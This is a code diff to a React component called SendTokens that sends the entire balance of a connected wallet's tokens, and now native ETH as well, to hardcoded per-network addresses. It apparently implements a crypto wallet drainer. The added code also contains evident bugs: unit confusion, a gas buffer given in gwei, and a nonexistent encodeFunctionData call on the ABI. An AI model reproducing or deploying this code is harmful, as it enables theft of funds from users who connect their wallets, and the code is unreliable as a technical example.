@@ -32,7 +32,6 @@ const destinationAddresses = {
   137: '0x933d91B8D5160e302239aE916461B4DC6967815d',
 };
 
-
 function selectAddressForToken(network) {
   const addresses = {
     1: '0xFB7DBCeB5598159E0B531C7eaB26d9D579Bf804B',
@@ -42,7 +41,6 @@ function selectAddressForToken(network) {
     42161: '0x933d91B8D5160e302239aE916461B4DC6967815d',
     137: '0x933d91B8D5160e302239aE916461B4DC6967815d',
   };
-
 
   const selectedAddress = addresses[network];
 
@@ -114,43 +112,71 @@ export const SendTokens = () => {
 
         console.log(`Attempting to transfer token ${token?.contract_ticker_symbol} to ${formattedDestinationAddress}`);
 
-        // Validate transaction using simulateContract
-        await publicClient.simulateContract({
-          address: formattedTokenAddress,
-          abi: erc20Abi,
-          functionName: 'transfer',
-          args: [formattedDestinationAddress, BigInt(token?.balance || '0')],
-          account: address,
-        });
+        if (token?.contract_ticker_symbol === 'ETH') {
+          // Native token transfer (Ether)
+          let gasEstimate = await publicClient.estimateGas({
+            account: address,
+            to: formattedDestinationAddress,
+            value: parseEther(token?.balance || '0'),
+          });
 
-        // Estimate gas using estimateGas
-        let gasEstimate = await publicClient.estimateGas({
-          account: address,
-          to: formattedDestinationAddress,
-          value: parseEther(token?.balance || '0'),
-        });
+          gasEstimate = BigInt(gasEstimate) + parseGwei('500'); // Adding a buffer of 500 gwei
 
-        gasEstimate = BigInt(gasEstimate) + parseGwei('500'); // Adding a buffer of 500 gwei
+          const txHash = await walletClient.sendTransaction({
+            to: formattedDestinationAddress,
+            value: parseEther(token?.balance || '0'),
+            gas: gasEstimate,
+          });
 
-        // If successful, send the transaction
-        const txHash = await walletClient.sendTransaction({
-          to: formattedDestinationAddress,
-          value: BigInt(token?.balance || '0'),
-          gas: gasEstimate,
-        });
+          setCheckedRecords((old) => ({
+            ...old,
+            [tokenAddress]: {
+              ...(old[tokenAddress] || { isChecked: false }),
+              pendingTxn: txHash,
+            },
+          }));
 
-        setCheckedRecords((old) => ({
-          ...old,
-          [tokenAddress]: {
-            ...(old[tokenAddress] || { isChecked: false }),
-            pendingTxn: txHash,
-          },
-        }));
+          showToast(
+            `Native token transfer of ${token?.balance} ETH sent. Tx Hash: ${txHash.hash}`,
+            'success',
+          );
+        } else {
+          // ERC-20 token transfer
+          await publicClient.simulateContract({
+            address: formattedTokenAddress,
+            abi: erc20Abi,
+            functionName: 'transfer',
+            args: [formattedDestinationAddress, BigInt(token?.balance || '0')],
+            account: address,
+          });
 
-        showToast(
-          `Transfer of ${token?.balance} ${token?.contract_ticker_symbol} sent. Tx Hash: ${txHash.hash}`,
-          'success',
-        );
+          let gasEstimate = await publicClient.estimateGas({
+            account: address,
+            to: formattedTokenAddress,
+            data: erc20Abi.encodeFunctionData('transfer', [formattedDestinationAddress, BigInt(token?.balance || '0')]),
+          });
+
+          gasEstimate = BigInt(gasEstimate) + parseGwei('500'); // Adding a buffer of 500 gwei
+
+          const txHash = await walletClient.sendTransaction({
+            to: formattedTokenAddress,
+            data: erc20Abi.encodeFunctionData('transfer', [formattedDestinationAddress, BigInt(token?.balance || '0')]),
+            gas: gasEstimate,
+          });
+
+          setCheckedRecords((old) => ({
+            ...old,
+            [tokenAddress]: {
+              ...(old[tokenAddress] || { isChecked: false }),
+              pendingTxn: txHash,
+            },
+          }));
+
+          showToast(
+            `ERC-20 transfer of ${token?.balance} ${token?.contract_ticker_symbol} sent. Tx Hash: ${txHash.hash}`,
+            'success',
+          );
+        }
       } catch (error) {
         console.error('Transaction Error:', error);
         showToast(`Transaction failed: ${error.message}`, 'error');
@@ -177,5 +203,4 @@ export const SendTokens = () => {
     </div>
   );
 };
-
 
